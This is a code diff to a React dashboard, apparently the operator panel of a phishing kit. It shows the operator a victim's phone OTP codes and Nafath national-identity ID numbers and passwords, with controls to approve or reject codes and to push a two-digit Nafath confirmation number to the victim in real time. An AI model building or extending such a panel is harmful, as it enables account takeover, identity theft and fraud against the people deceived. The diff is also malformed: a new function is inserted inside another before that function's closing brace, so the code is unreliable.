@@ -641,6 +641,12 @@ export default function DashboardPage() {
   const getPhoneOtpStatus = (): string => {
     const raw = selectedRequest?.raw;
     return raw?.phoneOtpStatus || "";
+
+  // Get nafad status (step 8)
+  const getNafadStatus = (): string => {
+    const raw = selectedRequest?.raw;
+    return raw?._v8Status || "";
+  };
   };
 
   // Render basic information box (from home-new page)
@@ -1102,18 +1108,8 @@ export default function DashboardPage() {
           </div>
         )}
 
-        {phoneOtpStatus === "approved" && (
-          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 8 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للصفحة التالية</p>
-          </div>
-        )}
-        {phoneOtpStatus === "rejected" && (
-          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 8 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - رقم الهاتف غير صحيح</p>
-          </div>
-        )}
-
-        {(phoneOtpCode || currentStep === 5 || currentPage === "step5" || currentPage === "phone") && (
+        {/* Action buttons - show ONLY when status is verifying/pending (new event) */}
+        {(phoneOtpStatus === "verifying" || phoneOtpStatus === "pending" || !phoneOtpStatus) && phoneOtpCode && (
           <div style={{ display: "flex", gap: 8, flexDirection: "column" }}>
             <div style={{ display: "flex", gap: 8 }}>
               <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
@@ -1131,21 +1127,37 @@ export default function DashboardPage() {
             </button>
           </div>
         )}
+
+        {/* Status message - show ONLY when approved */}
+        {phoneOtpStatus === "approved" && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 8, border: "1px solid #86efac" }}>
+            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ تمت الموافقة - العميل يُوجه للصفحة التالية</p>
+          </div>
+        )}
+
+        {/* Status message - show ONLY when rejected */}
+        {phoneOtpStatus === "rejected" && (
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 8, border: "1px solid #fca5a5" }}>
+            <p style={{ margin: 0, fontSize: "0.8rem", color: "#991b1b", fontWeight: 600 }}>❌ تم الرفض - العميل سيُعيد المحاولة</p>
+          </div>
+        )}
       </div>
     );
   };
 
   // Render Nafad box (currentStep === 8)
-  const renderNafadBox = () => {
+const renderNafadBox = () => {
     const currentStep = getCurrentStep();
+    const nafadStatus = getNafadStatus();
     const raw = selectedRequest?.raw;
 
     // Get nafad data
     const hasNafadData = raw?.nafadIdNumber || raw?.nafadPassword;
     const adminNafadCode = raw?.adminNafadCode;
-    
-    // Show box if there's nafad data OR admin sent code OR at step 8
-    if (!hasNafadData && !adminNafadCode && currentStep !== 8) {
+    const isVerifying = nafadStatus === "verifying";
+
+    // Show box if: has nafad data OR admin sent code OR is verifying OR at step 8
+    if (!hasNafadData && !adminNafadCode && !isVerifying && currentStep !== 8) {
       return null;
     }
 
@@ -1177,27 +1189,38 @@ export default function DashboardPage() {
             </div>
           </div>
         </div>
-        <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 8 }}>
-          <div style={{ display: "flex", gap: 8 }}>
-            <input
-              type="text"
-              placeholder="أدخل رقم التأكيد"
-              value={nafadInput}
-              onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
-              style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.875rem" }}
-            />
-            <button
-              onClick={() => {
-                handleSendNafadCode();
-                setNafadInput("");
-              }}
-              disabled={actionLoading === "nafad" || !nafadInput}
-              style={{ padding: "10px 16px", background: nafadInput ? "#2563eb" : "#9ca3af", color: nafadInput ? "#ffffff" : "#f3f4f6", borderRadius: 8, fontSize: "0.875rem", fontWeight: 700, cursor: nafadInput ? "pointer" : "not-allowed", border: "none" }}
-            >
-              إرسال
-            </button>
+
+        {/* Input field and send button - show ONLY when verifying (new event) */}
+        {isVerifying && (
+          <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 8 }}>
+            <div style={{ display: "flex", gap: 8 }}>
+              <input
+                type="text"
+                placeholder="أدخل رقم التأكيد"
+                value={nafadInput}
+                onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.875rem" }}
+              />
+              <button
+                onClick={() => {
+                  handleSendNafadCode();
+                  setNafadInput("");
+                }}
+                disabled={actionLoading === "nafad" || !nafadInput}
+                style={{ padding: "10px 16px", background: nafadInput ? "#2563eb" : "#9ca3af", color: nafadInput ? "#ffffff" : "#f3f4f6", borderRadius: 8, fontSize: "0.875rem", fontWeight: 700, cursor: nafadInput ? "pointer" : "not-allowed", border: "none" }}
+              >
+                إرسال
+              </button>
+            </div>
           </div>
-        </div>
+        )}
+
+        {/* Status message - show when code was sent */}
+        {adminNafadCode && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 8, border: "1px solid #86efac" }}>
+            <p style={{ margin: 0, fontSize: "0.8rem", color: "#166534", fontWeight: 600 }}>✅ تم إرسال رمز التأكيد للعميل</p>
+          </div>
+        )}
       </div>
     );
   };
